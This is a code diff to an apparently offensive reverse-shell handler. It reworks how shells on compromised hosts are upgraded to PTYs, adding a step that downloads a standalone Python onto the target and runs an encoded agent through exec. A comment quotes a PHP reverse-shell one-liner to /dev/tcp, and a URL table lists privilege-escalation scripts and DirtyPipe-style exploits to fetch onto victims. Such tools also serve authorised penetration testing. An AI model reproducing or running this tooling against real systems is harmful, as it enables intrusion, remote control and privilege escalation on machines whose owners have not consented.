@@ -792,9 +792,9 @@ class MainMenu(BetterCMD):
 	def interrupt(self):
 		if core.attached_session and not core.attached_session.type == 'Readline':
 			core.attached_session.detach()
-		else:
+		else: # TODO
 			if menu.sid and not core.sessions[menu.sid].agent: # TEMP
-				core.sessions[menu.sid].control_session.subchannel.control << 'stop'
+				core.sessions[menu.sid].subchannel.control << 'stop'
 
 	def show_help(self, command):
 		help_prompt = re.compile(r"Run 'help [^\']*' for more information") # TODO
@@ -895,20 +895,17 @@ class MainMenu(BetterCMD):
 				return True
 		else:
 			if core.sessions:
-				for host, sessions in core.hosts.items():
+				for host, sessions in tuple(core.hosts.items()):
 					if not sessions:
 						continue
 					print('\n➤  ' + sessions[0].name_colored)
 					table = Table(joinchar=' | ')
 					table.header = [paint(header).cyan for header in ('ID', 'Shell', 'User', 'Source')]
-					for session in sessions:
+					for session in tuple(sessions):
 						if self.sid == session.id:
 							ID = paint('[' + str(session.id) + ']').red
 						elif session.new:
-							if session.host_needs_control_session and session.control_session is session:
-								ID = paint(' ' + str(session.id)).cyan
-							else:
-								ID = paint('<' + str(session.id) + '>').yellow_BLINK
+							ID = paint('<' + str(session.id) + '>').yellow_BLINK
 						else:
 							ID = paint(' ' + str(session.id)).yellow
 						source = session.listener or f'Connect({session._host}:{session.port})'
@@ -1209,7 +1206,7 @@ class MainMenu(BetterCMD):
 				num = int(line)
 				options.maintain = num
 				refreshed = False
-				for host in core.hosts.values():
+				for host in tuple(core.hosts.values()):
 					if len(host) < num:
 						refreshed = True
 						host[0].maintain()
@@ -1567,8 +1564,6 @@ class Core:
 		self.wlist = []
 
 		self.attached_session = None
-		self.session_wait_host = None
-		self.session_wait = queue.LifoQueue()
 
 		self.lock = threading.Lock() # TO REMOVE
 		self.conn_semaphore = threading.Semaphore(5)
@@ -2062,7 +2057,9 @@ class Session:
 			self._can_deploy_agent = None
 
 			self.upgrade_attempted = False
+			self.upgrade_standalone_attempted = False
 			self.uploaded_paths = {}
+			self.attaching = False
 
 			core.rlist.append(self)
 
@@ -2106,9 +2103,6 @@ class Session:
 				self.id = core.new_sessionID
 				core.hosts[self.name].append(self)
 				core.sessions[self.id] = self
-
-				if self.name == core.session_wait_host:
-					core.session_wait.put(self.id)
 
 				new_banner = f"[New {self.source.title()} Shell]"
 				logger.info(
@@ -2225,31 +2219,6 @@ class Session:
 					self._can_deploy_agent = False
 
 		return self._can_deploy_agent
-
-	@property
-	def spare_control_sessions(self):
-		return [session for session in self.host_control_sessions if session is not self]
-
-	@property
-	def host_needs_control_session(self):
-		return [session for session in core.hosts[self.name] if session.need_control_session]
-
-	@property
-	def need_control_session(self):
-		return all([self.OS == 'Unix', self.type == 'PTY', not self.agent, not self.new])
-
-	@property
-	def host_control_sessions(self):
-		return [session for session in core.hosts[self.name] if not session.need_control_session]
-
-	@property
-	def control_session(self):
-		if self.need_control_session:
-			for session in core.hosts[self.name]:
-				if not session.need_control_session:
-					return session
-			return None # TODO self.spawn()
-		return self
 
 	def get_system_info(self):
 		self.hostname = self.system = self.arch = ''
@@ -2429,8 +2398,8 @@ class Session:
 				if self.OS == "Unix":
 					binaries = [
 						"sh", "bash", "python", "python3", "uname",
-						"script", "socat", "tty", "echo", "base64", "wget",
-						"curl", "tar", "rm", "stty", "setsid", "find", "nc"
+						"tty", "echo", "base64", "wget", "curl", "tar",
+						"rm", "stty", "setsid", "find", "nc"
 					]
 					response = self.exec(f'for i in {" ".join(binaries)}; do which $i 2>/dev/null || echo;done')
 					if response:
@@ -2779,15 +2748,6 @@ class Session:
 			return None
 
 		with self.lock:
-			if self.need_control_session:
-				args = locals()
-				del args['self']
-				try:
-					response = self.control_session.exec(**args)
-					return response
-				except AttributeError: # No control session
-					logger.error("Spawn MANUALLY a new shell for this session to operate properly")
-					return None
 
 			if not self or not self.subchannel.can_use:
 				logger.debug("Exec: The session is killed")
@@ -2992,24 +2952,13 @@ class Session:
 				logger.warning("Python Agent is already deployed")
 				return False
 
-			if self.host_needs_control_session and self.host_control_sessions == [self]:
-				logger.warning("This is a control session and cannot be upgraded")
-				return False
-
-			if self.pty_ready:
-				if self.can_deploy_agent:
-					logger.info("Attempting to deploy Python Agent...")
-				else:
-					logger.warning("This shell is already PTY")
-			else:
-				logger.info("Upgrading shell to PTY...")
-
 			self.shell = self.bin['bash'] or self.bin['sh']
 			if not self.shell:
-				logger.warning("Cannot detect shell. Abort upgrading...")
+				logger.error("Cannot detect shell. Abort upgrading...")
 				return False
 
 			if self.can_deploy_agent:
+				logger.debug("Attempting to deploy Python Agent...")
 				_bin = self.bin['python3'] or self.bin['python']
 				if self.remote_python_version >= (3,):
 					_decode = 'b64decode'
@@ -3029,88 +2978,69 @@ class Session:
 				payload = base64.b64encode(compress(agent.encode(), 9)).decode()
 				cmd = f'{_bin} -Wignore -c \'import base64,zlib;exec(zlib.decompress(base64.{_decode}("{payload}")))\''
 
-			elif not self.pty_ready:
-				socat_cmd = f"{{}} - exec:{self.shell},pty,stderr,setsid,sigint,sane;exit 0"
-				if self.bin['script']:
-					_bin = self.bin['script']
-					cmd = f"{_bin} -q /dev/null; exit 0"
+				if self.pty_ready:
+					self.exec("stty -echo")
+					self.echoing = False
 
-				elif self.bin['socat']:
-					_bin = self.bin['socat']
-					cmd = socat_cmd.format(_bin)
+				elif self.interactive:
+					# Some shells are unstable in interactive mode
+					# For example: <?php passthru("bash -i >& /dev/tcp/X.X.X.X/4444 0>&1"); ?>
+					# Silently convert the shell to non-interactive before PTY upgrade.
+					self.interactive = False
+					self.echoing = True
+					self.exec(f"exec {self.shell}", raw=True)
+					self.echoing = False
 
-				else:
-					_bin = "/var/tmp/socat"
-					if not self.exec(f"test -f {_bin} || echo x"): # TODO maybe needs rstrip
-						cmd = socat_cmd.format(_bin)
-					else:
-						logger.warning("Cannot upgrade shell with the available binaries...")
-						socat_binary = self.need_binary("socat", URLS['socat'])
-						if socat_binary:
-							_bin = socat_binary
-							cmd = socat_cmd.format(_bin)
-						else:
-							if readline:
-								logger.info("Readline support enabled")
-								self.type = 'Readline'
-								return True
-							else:
-								logger.error("Falling back to Raw shell")
-								return False
-
-			if not self.can_deploy_agent and not self.spare_control_sessions:
-				logger.warning("Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY")
-				core.session_wait_host = self.name
-				self.spawn()
-				try:
-					new_session = core.sessions[core.session_wait.get(timeout=self.timeout_short)]
-					core.session_wait_host = None
-
-				except queue.Empty:
-					logger.error("Failed spawning new session")
+				shell_marker = struct.pack(Messenger._TYPE_CODE, Messenger.SHELL)
+				response = self.exec(
+					f'export TERM=xterm-256color; export SHELL={self.shell}; {cmd}',
+					separate=True,
+					expect_func=lambda data: shell_marker in data,
+					raw=True
+				)
+				if not isinstance(response, bytes):
+					logger.error("The shell became unresponsive. I am killing it, sorry... Next time I will not try to deploy agent")
+					Path(self.directory / ".noagent").touch()
+					self.kill()
 					return False
 
-				if self.pty_ready:
-					return True
+				logger.info(f"Agent deployed via {paint(_bin).green}")
 
-			if self.pty_ready:
-				self.exec("stty -echo")
-				self.echoing = False
-
-			elif self.interactive:
-				# Some shells are unstable in interactive mode
-				# For example: <?php passthru("bash -i >& /dev/tcp/X.X.X.X/4444 0>&1"); ?>
-				# Silently convert the shell to non-interactive before PTY upgrade.
-				self.interactive = False
+				self.agent = True
+				self.type = 'PTY'
+				self.interactive = True
 				self.echoing = True
-				self.exec(f"exec {self.shell}", raw=True)
-				self.echoing = False
+				self.prompt = response
+				self.get_shell_info()
+				return True
 
-			shell_marker = struct.pack(Messenger._TYPE_CODE, Messenger.SHELL)
-			response = self.exec(
-				f'export TERM=xterm-256color; export SHELL={self.shell}; {cmd}',
-				separate=self.can_deploy_agent,
-				expect_func=lambda data: not self.can_deploy_agent or shell_marker in data,
-				raw=True
-			)
-			if self.can_deploy_agent and not isinstance(response, bytes):
-				logger.error("The shell became unresponsive. I am killing it, sorry... Next time I will not try to deploy agent")
-				Path(self.directory / ".noagent").touch()
-				self.kill()
+			if not self.upgrade_standalone_attempted:
+				self.upgrade_standalone_attempted = True
+				logger.warning("Cannot deploy agent...")
+				python_binary = PYTHON_STANDALONE_BINARIES.get((self.system, self.arch))
+				if not python_binary:
+					logger.error(f'Unsupported target platform: {self.system} {self.arch}')
+					return False
+
+				python_binary = self.need_binary("Standalone Python", URLS[python_binary])
+				if python_binary:
+					if python_binary.endswith(".gz"):
+						python_binary = self.exec(f'PY_TMP="$(mktemp -d)" && tar -xzf "{python_binary}" -C "$PY_TMP" && export PATH="$PY_TMP/python/bin:$PATH" && ls $PY_TMP/python/bin/python3', value=True)
+						if not python_binary.startswith("/"):
+							logger.error("Failed to deploy standalone python...")
+							return False
+					self._can_deploy_agent = None
+					self._bin['python3'] = python_binary
+					return self.upgrade()
+
+			logger.error("Cannot deploy agent...")
+			if readline:
+				logger.info("Readline support enabled")
+				self.type = 'Readline'
+				return True
+			else:
+				logger.error("Falling back to Raw shell")
 				return False
-
-			logger.info(f"PTY upgrade successful via {paint(_bin).green}")
-
-			self.agent = self.can_deploy_agent
-			self.type = 'PTY'
-			self.interactive = True
-			self.echoing = True
-			self.prompt = response
-
-			self.get_shell_info()
-
-			if _bin == self.bin['script']:
-				self.exec("stty sane")
 
 		elif self.OS == "Windows":
 			if self.type != 'PTY':
@@ -3124,12 +3054,6 @@ class Session:
 		if self.OS == 'Unix':
 			if self.agent:
 				self.send(Messenger.message(Messenger.RESIZE, struct.pack("HH", lines, columns)))
-			else: # TODO
-				threading.Thread(
-					target=self.exec,
-					args=(f"stty rows {lines} columns {columns} < {self.tty}",),
-					name="RESIZE"
-				).start() #TEMP
 		elif self.OS == 'Windows': # TODO
 			pass
 
@@ -3154,10 +3078,10 @@ class Session:
 
 	def attach(self):
 		if threading.current_thread().name != 'Core':
+			self.attaching = True
 			if self.new:
 				upgrade_conditions = [
 					not options.no_upgrade,
-					not (self.need_control_session and self.host_control_sessions == [self]),
 					not self.upgrade_attempted
 				]
 				if all(upgrade_conditions):
@@ -3168,12 +3092,13 @@ class Session:
 				for module in modules().values():
 					if module.enabled and module.on_first_attach:
 						module.run(self, None)
-
+			if not self.attaching:
+				return False
 			core.control << (lambda: core.sessions[self.id].attach())
-			menu.active.clear() # Redundant but safeguard
 			return True
 
 		if core.attached_session is not None:
+			self.attaching = False
 			return False
 
 		if self.type == 'PTY':
@@ -3194,6 +3119,8 @@ class Session:
 		print(paint('─' * shutil.get_terminal_size()[0]).darkgrey)
 
 		core.attached_session = self
+		self.attaching = False
+		menu.active.clear()
 		core.rlist.append(sys.stdin)
 
 		stdout(bytes(self.last_lines))
@@ -3213,8 +3140,6 @@ class Session:
 		self._cwd = None
 		if self.agent:
 			self.exec(f"os.chdir('{self.cwd}')", python=True, value=True)
-		elif self.need_control_session:
-			self.exec(f"cd {self.cwd}")
 
 	def get_subtype(self):
 		response = self.exec("$PSVersionTable", expect_func=lambda x: b":\\" in x, raw=True)
@@ -3225,7 +3150,7 @@ class Session:
 				self.subtype = 'cmd'
 
 	def detach(self):
-		if self and self.OS == 'Unix' and (self.agent or self.need_control_session):
+		if self and self.OS == 'Unix' and self.agent:
 			threading.Thread(target=self.sync_cwd).start()
 
 		if self and self.OS == 'Windows' and self.type != 'PTY':
@@ -4052,14 +3977,6 @@ class Session:
 
 		if thread_name != 'Core':
 			if self.OS:
-				if self.host_needs_control_session and\
-					not self.spare_control_sessions and\
-					self.control_session is self:
-
-					sessions = ', '.join([str(session.id) for session in self.host_needs_control_session])
-					logger.warning(f"Cannot kill Session {self.id} as the following sessions depend on it: [{sessions}]")
-					return False
-
 				for module in modules().values():
 					if module.enabled and module.on_session_end:
 						module.run(self, None)
@@ -4104,6 +4021,9 @@ class Session:
 
 		if self.is_attached:
 			self.detach()
+		elif self.attaching:
+			self.attaching = False
+			menu.show()
 
 		for portfwd in self.tasks['portfwd']:
 			info, control, stop, thread, server = portfwd
@@ -5640,7 +5560,7 @@ def main():
 		#stdout_handler.addFilter(lambda record: True if record.levelno != logging.DEBUG else False)
 		#logger.setLevel('DEBUG')
 		#options.max_maintain = 50
-		#options.no_bins = 'python,python3,script'
+		#options.no_bins = 'python,python3'
 
 	if options.oscp_safe:
 		meterpreter.enabled = False
@@ -5775,10 +5695,13 @@ TERMINAL = next((term for term in TERMINALS if shutil.which(term)), None)
 MAX_CMD_PROMPT_LEN = 335
 LINUX_PATH = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
 URLS = {
+	'python_linux_x86_64':'https://github.com/astral-sh/python-build-standalone/releases/download/20260610/cpython-3.13.14+20260610-x86_64-unknown-linux-musl-install_only_stripped.tar.gz',
+	'python_linux_aarch64':'https://github.com/astral-sh/python-build-standalone/releases/download/20260610/cpython-3.13.14+20260610-aarch64-unknown-linux-musl-install_only_stripped.tar.gz',
+	'python_macos_x86_64':'https://github.com/astral-sh/python-build-standalone/releases/download/20260610/cpython-3.13.14+20260610-x86_64-apple-darwin-install_only_stripped.tar.gz',
+	'python_macos_aarch64':'https://github.com/astral-sh/python-build-standalone/releases/download/20260610/cpython-3.13.14+20260610-aarch64-apple-darwin-install_only_stripped.tar.gz',
 	'linpeas':	"https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",
 	'winpeas_bat':	"https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat",
 	'winpeas_any':	"https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe",
-	'socat':	"https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat",
 	'ncat':		"https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/ncat",
 	'lse':		"https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh",
 	'powerup':	"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Privesc/PowerUp.ps1",
@@ -5818,6 +5741,15 @@ URLS = {
 	'dirtyfrag_zip':	"https://github.com/v4bel/dirtyfrag/archive/refs/heads/master.zip",
 	'dirtypipe_zip':	"https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/archive/refs/heads/main.zip",
 }
+
+PYTHON_STANDALONE_BINARIES = {
+	('Linux', 'x86_64'): 'python_linux_x86_64',
+	('Linux', 'aarch64'): 'python_linux_aarch64',
+
+	('Darwin', 'x86_64'): 'python_macos_x86_64',
+	('Darwin', 'arm64'): 'python_macos_aarch64',
+}
+
 EMOJIS = {
 	'folder':'📁', 'file':'📄', 'invalid_shell':'🙄', 'new_shell':'😍️', 'target':'🎯', 'upgrade':'💪', 'logfile':'📜',
 	'lost':'💔', 'home':'🏠', 'bug':'🐞', 'skull':'💀', 'refresh':'🔄', 'cancel':'🚫', 'no_sessions':'😟', 'user':'👤'
